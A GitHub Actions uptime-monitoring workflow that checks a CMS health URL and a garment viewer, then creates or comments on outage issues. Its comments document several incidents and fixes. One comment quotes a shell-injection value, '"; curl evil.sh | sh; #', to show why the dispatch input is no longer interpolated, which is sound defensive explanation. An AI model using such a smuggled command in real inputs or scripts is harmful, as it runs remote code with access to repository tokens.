name: Uptime

on:
  schedule:
    # REQUESTED every 15 min — and that is a request, not a guarantee. Measured
    # 2026-08-10 over the 100 most recent runs (94.3 h): GitHub delivered 27% of
    # this rate, median gap 44.7 min, p90 102 min, worst 6.1 h. Every run that
    # fires still succeeds, which is why it went unnoticed. Do not read "15" here
    # as the detection time. See docs/RUNBOOK.md → "Uptime alerts".
    - cron: '*/15 * * * *'
  workflow_dispatch:
    inputs:
      target:
        description: Override URL to check (use a bogus URL to test the alert path)
        required: false

# A `permissions:` block REPLACES the default token grants — it does not add to
# them. So listing only `issues: write` silently set `contents` to `none`, and
# `actions/checkout` on a PRIVATE repo then fails with "Repository not found"
# (GitHub returns 404, not 403, so it reads as a deleted repo rather than a
# permissions problem).
#
# That is exactly what happened. 0afdbc9 was titled "no checkout present" — the
# job deliberately had none, so this block was harmless. 8301e60 then added
# `actions/checkout@v4` on 2026-08-05 10:36 UTC to run the new garment check, and
# every scheduled run since has died at checkout. Last green run: 08:50 UTC the
# same day, the run immediately before it.
#
# The monitor was not reporting the site as down — it never reached the ping at
# all, for ~23 hours, while the failures looked like ordinary uptime alerts.
permissions:
  contents: read
  issues: write

jobs:
  ping:
    # Only after go-live (Phase 10).
    if: vars.DEPLOY_ENABLED == 'true'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      GH_REPO: ${{ github.repository }}
      HEALTH_URL: ${{ github.event.inputs.target || format('{0}/api/health', vars.VITE_API_BASE_URL || 'https://cms.wear-run.help') }}
      # Must be a LIVE product AND colour slug. This was `/n001/navy` until
      # 2026-08-07, three days after `navy` was retired — and it kept returning 200,
      # because a retired slug correctly falls back to the default colourway. That
      # fallback is the product behaviour a printed QR tag depends on, which is
      # exactly why a monitor must not point at one: it would exercise the fallback
      # forever and never the normal path. `scripts/smoke-viewer-payload.mjs`
      # records the same reasoning for its own default; this file was missed in that
      # pass.
      #
      # ⚠️ THEN THE PRODUCT DRIFTED TOO, and this URL alone could never have shown
      # it. `n001` → `rxps` on 2026-08-15, by which time `/api/public/viewer/n001/wine`
      # had been returning 404. This job stayed GREEN throughout — six consecutive
      # successes in the two hours before it was found — because the viewer is an
      # SPA: `viewer.wear-run.help/<anything>` returns 200 HTML and then renders
      # "REFERENCE UNAVAILABLE" on the client. A status check on this URL proves a
      # web server answered, not that a garment exists. The real assertion in this
      # job is the `smoke-viewer-payload.mjs` step below, which reads the API.
      VIEWER_URL: https://viewer.wear-run.help/rxps/wine
      # The raw dispatch input, carried as an environment variable so the shell
      # below can test it WITHOUT interpolating it. `if [ "${{ ... }}" = "" ]`
      # pastes the operator's string straight into the script, so a `target` of
      # `"; curl evil.sh | sh; #` would execute — and this job holds GH_TOKEN.
      # Triggering `workflow_dispatch` needs write access, so this was never
      # externally reachable; it is fixed because the shape is the bug, and the
      # next person to copy this block may not be so lucky. Quoted `"$VAR"` tests
      # are inert no matter what the value contains.
      TARGET_OVERRIDE: ${{ github.event.inputs.target }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        if: github.event.inputs.target == ''
        with:
          persist-credentials: false

      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        if: github.event.inputs.target == ''
        with:
          node-version: 24

      - name: Check CMS health + viewer
        id: check
        run: |
          ok=true
          # --retry 2: a single 20-second sample on a best-effort cron decides whether
          # to page the owner, so one transient blip opened an outage issue for a site
          # that was fine. Retries cost nothing when the site is up and remove most of
          # that noise; a genuine outage still fails all three attempts. `--retry-all-errors`
          # is needed because plain --retry only retries transient HTTP codes, not the
          # connection failures an actual outage produces.
          curl -fsS --max-time 20 --retry 2 --retry-delay 5 --retry-all-errors "$HEALTH_URL" || ok=false
          if [ -z "$TARGET_OVERRIDE" ]; then
            curl -fsS --max-time 20 --retry 2 --retry-delay 5 --retry-all-errors -o /dev/null "$VIEWER_URL" || ok=false
            # Both curls above pass against a product serving NO MODEL: the SPA
            # shell returns 200 and renders its no-model state. This resolves the
            # model URL the way the viewer does and fetches it, so a garment that
            # silently lost its GLB pages someone instead of sitting there.
            # Skipped on a manual `target` override, which is for testing the
            # alert path with a bogus URL.
            node scripts/smoke-viewer-payload.mjs || ok=false
          fi
          echo "ok=$ok" >> "$GITHUB_OUTPUT"

      # ALERT ON EVERY OUTAGE — never go silent because an old issue is open.
      #
      # This step used to be "if any open `outage` issue exists, do nothing". That
      # rule has no sense of TIME, so a single unclosed issue disabled alerting
      # permanently. It did: issue #2 was opened automatically on 2026-07-21, was
      # never closed, and for 17 days every subsequent failure would have turned
      # this workflow red in the Actions tab and notified nobody. Closing #2 fixed
      # that day; it did nothing about the mechanism, and the next real outage
      # opens an issue that is just as easy to forget.
      #
      # The dedup goal was right — nobody wants 96 identical issues a day. So the
      # fix is not to drop it but to change what "already alerted" means: comment
      # on the open issue instead of staying quiet. GitHub notifies on comments,
      # so a new outage always reaches someone, while a quiet window keeps a
      # sustained outage to about one notification an hour rather than four.
      #
      # The failing branch here is only ever exercised when something is already
      # broken, which is exactly why it must not be clever. Verify it the way this
      # workflow was built to be verified — `workflow_dispatch` with a bogus
      # `target` — rather than by reading it.
      - name: Alert — create an outage issue, or comment on the open one
        if: steps.check.outputs.ok == 'false'
        env:
          # This said "Uptime runs every ~15 min … roughly one notification per
          # hour". Measured 2026-08-10 the delivered median gap is ~45 min, so a
          # 60-minute quiet period actually yields one notification per ~90 min:
          # the run at ~45 min falls inside the window and stays quiet, the run at
          # ~90 min speaks. That is the safe direction (fewer, not more), and the
          # FIRST failure after a long-stale issue still speaks up immediately.
          # See docs/RUNBOOK.md → "Uptime alerts".
          ALERT_QUIET_MINUTES: '60'
        run: |
          set -euo pipefail

          # `|| true` only for the already-exists case: creating a label that is
          # already there is the normal path and must not fail the alert. Any
          # other failure (bad token, API down) is reported, because it means the
          # issue below probably will not be created either — and an uptime
          # workflow that silently stops alerting is worse than no uptime
          # workflow.
          if ! label_out=$(gh label create outage --color b60205 \
                             --description "Automated uptime alert" 2>&1); then
            grep -qi 'already exists' <<<"$label_out" || echo "::warning::gh label create failed: $label_out"
          fi

          # printf, NOT "\n" inside a double-quoted string. Bash does not expand
          # \n there, so every issue this workflow opened before 2026-08-07 carries
          # LITERAL backslash-n in its body — see issue #2, which reads
          # "...2026.\n\nHealth: https://..." on one line.
          body=$(printf '%s\n\n%s\n%s\n\n%s\n' \
            "Automated uptime check failed at $(date -u)." \
            "Health: $HEALTH_URL" \
            "Viewer: $VIEWER_URL" \
            "See docs/RUNBOOK.md → uptime response.")

          # Newest open outage issue and when it was last touched. `updatedAt`
          # moves on comments too, so commenting resets the quiet window.
          #
          # `// empty` IS LOAD-BEARING. Without it, `last` on an empty array is
          # null and the interpolation yields the literal string "null null" —
          # which is not empty, so the -z test below fails and this would try to
          # comment on issue #null instead of creating the FIRST issue. That is
          # the no-issue-yet path, i.e. the one every genuine first outage takes.
          # Verified against jq directly, not reasoned about.
          existing=$(gh issue list --label outage --state open \
                       --json number,updatedAt \
                       --jq 'sort_by(.updatedAt) | last // empty | "\(.number) \(.updatedAt)"')

          if [ -z "$existing" ]; then
            gh issue create --label outage \
              --title "Outage: health check failing" \
              --body "$body"
            exit 0
          fi

          num=${existing%% *}
          updated=${existing#* }
          # GNU date on the runner; the BSD form is the fallback for a local run.
          updated_epoch=$(date -u -d "$updated" +%s 2>/dev/null \
                          || date -u -jf "%Y-%m-%dT%H:%M:%SZ" "$updated" +%s)
          age_min=$(( ( $(date -u +%s) - updated_epoch ) / 60 ))

          if [ "$age_min" -ge "$ALERT_QUIET_MINUTES" ]; then
            gh issue comment "$num" --body "$body"
            echo "Commented on #$num — last activity ${age_min}m ago."
          else
            echo "#$num was updated ${age_min}m ago, inside the ${ALERT_QUIET_MINUTES}m quiet window — not commenting."
          fi
